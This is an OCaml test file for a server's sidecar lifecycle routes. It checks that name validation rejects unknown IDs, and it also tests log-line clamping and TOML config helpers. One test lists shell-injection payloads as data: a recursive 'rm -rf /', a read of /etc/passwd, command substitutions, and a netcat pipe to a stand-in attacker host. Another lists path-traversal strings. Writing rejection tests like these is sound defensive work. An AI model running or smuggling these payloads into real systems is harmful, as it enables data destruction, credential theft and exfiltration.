(** Negative-path tests for /api/v1/sidecar/* routes.

    The HTTP layer is a thin wrapper around [validate_name] + a shell-out
    to the sidecar [run.sh]. The thing worth pinning is that any
    not-whitelisted [name=] short-circuits at [validate_name] BEFORE the
    code reaches [Sys.command] or [Process_eio.run_argv_with_status].

    Source of truth for endpoint design: docs/SIDECAR-LIFECYCLE-API-RFC.md.
*)

open Alcotest

module Routes = Masc_mcp.Server_routes_http_routes_sidecar

let result_of = function
  | Ok s -> "Ok " ^ s
  | Error e -> "Error " ^ e

let result_t = testable (Fmt.of_to_string result_of) ( = )

let validate name = Routes.validate_name name

(* ---- Happy path: every known sidecar id is accepted verbatim. ---- *)

let test_validate_accepts_each_known_id () =
  List.iter (fun id ->
    check result_t (Printf.sprintf "id %s is accepted" id) (Ok id) (validate (Some id))
  ) Routes.known_ids

(* ---- Whitelist enforcement. ---- *)

let test_validate_rejects_none () =
  check result_t "missing name → error"
    (Error "missing 'name' query parameter")
    (validate None)

let test_validate_rejects_unknown_id () =
  check result_t "wholly unknown id rejected"
    (Error "unknown sidecar id: facebook")
    (validate (Some "facebook"))

(* ---- Injection attempts: the only thing that matters is that an attacker-
       controlled string never falls through to Sys.command. The error message
       carries the raw input back, but the Result is Error, so handle_start /
       handle_stop short-circuit before any subprocess. ---- *)

let test_validate_rejects_shell_meta () =
  let payloads = [
    "discord;rm -rf /";
    "discord && cat /etc/passwd";
    "discord$(id)";
    "discord`whoami`";
    "discord|nc attacker.example 4444";
    "discord\nimessage";
  ] in
  List.iter (fun p ->
    match validate (Some p) with
    | Ok _ -> failf "shell-meta payload %S unexpectedly accepted" p
    | Error _ -> ()
  ) payloads

let test_validate_rejects_path_traversal () =
  let payloads = [
    "../../etc/passwd";
    "discord/../slack";
    "./discord";
    "/discord";
    "";
    "   ";
  ] in
  List.iter (fun p ->
    match validate (Some p) with
    | Ok _ -> failf "path-traversal payload %S unexpectedly accepted" p
    | Error _ -> ()
  ) payloads

(* ---- Whitelist size invariant. The dashboard mirrors this list as
       KNOWN_CONNECTOR_IDS in connector-status.ts; if a fifth bridge is
       added without updating both, the dashboard will draw a card the
       backend refuses to spawn. ---- *)

let test_known_ids_size_matches_dashboard () =
  check int "exactly 4 known sidecars (matches dashboard KNOWN_CONNECTOR_IDS)"
    4 (List.length Routes.known_ids)

(* ---- clamp_lines: bound the ?lines=N query param to [1, 1000] so a
       client can't ask for unbounded log content. ---- *)

let test_clamp_lines_default_when_missing () =
  check int "missing → 200" 200 (Routes.clamp_lines None)

let test_clamp_lines_passes_in_range () =
  check int "300 → 300" 300 (Routes.clamp_lines (Some 300))

let test_clamp_lines_clamps_below_one () =
  check int "0 → 1" 1 (Routes.clamp_lines (Some 0));
  check int "-50 → 1" 1 (Routes.clamp_lines (Some (-50)))

let test_clamp_lines_clamps_above_max () =
  check int "1001 → 1000" 1000 (Routes.clamp_lines (Some 1001));
  check int "100000 → 1000" 1000 (Routes.clamp_lines (Some 100000))

(* ---- Config write helpers (PUT /api/v1/sidecar/config). ---- *)

let test_escape_quotes_and_backslash () =
  check string "double-quote escaped"
    "abc\\\"def"
    (Routes.escape_toml_string "abc\"def");
  check string "backslash escaped"
    "x\\\\y"
    (Routes.escape_toml_string "x\\y")

let test_escape_control_chars () =
  check string "newline escaped"
    "a\\nb"
    (Routes.escape_toml_string "a\nb");
  check string "tab escaped"
    "a\\tb"
    (Routes.escape_toml_string "a\tb")

let test_render_value_quotes_strings () =
  check string "string wrapped in quotes"
    "\"hello\""
    (Routes.render_value (Routes.Tstring "hello"));
  check string "int rendered bare"
    "120"
    (Routes.render_value (Routes.Tint 120));
  check string "true bare"
    "true"
    (Routes.render_value (Routes.Tbool true));
  check string "false bare"
    "false"
    (Routes.render_value (Routes.Tbool false))

let test_render_toml_sorts_keys () =
  let body =
    Routes.render_toml
      [ ("Z_LAST", Routes.Tstring "z");
        ("A_FIRST", Routes.Tstring "a");
        ("M_MID", Routes.Tint 5);
      ]
  in
  let lines = String.split_on_char '\n' body in
  match lines with
  | "A_FIRST = \"a\"" :: "M_MID = 5" :: "Z_LAST = \"z\"" :: _ -> ()
  | _ -> failf "lines not in alpha order: %s" body

let test_coerce_integer_accepts_and_rejects () =
  (match Routes.coerce_value `Integer "120" with
   | Ok (Routes.Tint 120) -> ()
   | _ -> failf "120 should coerce to Tint 120");
  (match Routes.coerce_value `Integer "  -5  " with
   | Ok (Routes.Tint -5) -> ()
   | _ -> failf "trimmed -5 should coerce");
  (match Routes.coerce_value `Integer "abc" with
   | Error _ -> ()
   | _ -> failf "abc should NOT coerce to integer")

let test_coerce_boolean_accepts_variants () =
  (match Routes.coerce_value `Boolean "true" with
   | Ok (Routes.Tbool true) -> ()
   | _ -> failf "true should coerce");
  (match Routes.coerce_value `Boolean "FALSE" with
   | Ok (Routes.Tbool false) -> ()
   | _ -> failf "FALSE (case) should coerce");
  (match Routes.coerce_value `Boolean "1" with
   | Ok (Routes.Tbool true) -> ()
   | _ -> failf "1 should coerce as bool true");
  (match Routes.coerce_value `Boolean "yes" with
   | Error _ -> ()
   | _ -> failf "yes should NOT coerce — only true/false/0/1")

let test_coerce_rejects_oversized_value () =
  let huge = String.make 9000 'x' in
  match Routes.coerce_value `String huge with
  | Error _ -> ()
  | Ok _ -> failf "9000-byte value should be rejected by max_value_bytes guard"

let () =
  run "sidecar_lifecycle_routes"
    [
      ( "validate_name",
        [
          test_case "accepts every known id" `Quick test_validate_accepts_each_known_id;
          test_case "rejects None"           `Quick test_validate_rejects_none;
          test_case "rejects unknown id"     `Quick test_validate_rejects_unknown_id;
          test_case "rejects shell meta"     `Quick test_validate_rejects_shell_meta;
          test_case "rejects path traversal" `Quick test_validate_rejects_path_traversal;
        ] );
      ( "clamp_lines",
        [
          test_case "default when missing" `Quick test_clamp_lines_default_when_missing;
          test_case "passes in range"      `Quick test_clamp_lines_passes_in_range;
          test_case "clamps below 1"       `Quick test_clamp_lines_clamps_below_one;
          test_case "clamps above 1000"    `Quick test_clamp_lines_clamps_above_max;
        ] );
      ( "invariants",
        [
          test_case "known_ids size = 4" `Quick test_known_ids_size_matches_dashboard;
        ] );
      ( "config_write_helpers",
        [
          test_case "escape: quotes + backslash"  `Quick test_escape_quotes_and_backslash;
          test_case "escape: control chars"       `Quick test_escape_control_chars;
          test_case "render_value: each variant"  `Quick test_render_value_quotes_strings;
          test_case "render_toml: alpha-sort"     `Quick test_render_toml_sorts_keys;
          test_case "coerce: integer ok/err"      `Quick test_coerce_integer_accepts_and_rejects;
          test_case "coerce: boolean variants"    `Quick test_coerce_boolean_accepts_variants;
          test_case "coerce: oversized rejected"  `Quick test_coerce_rejects_oversized_value;
        ] );
    ]
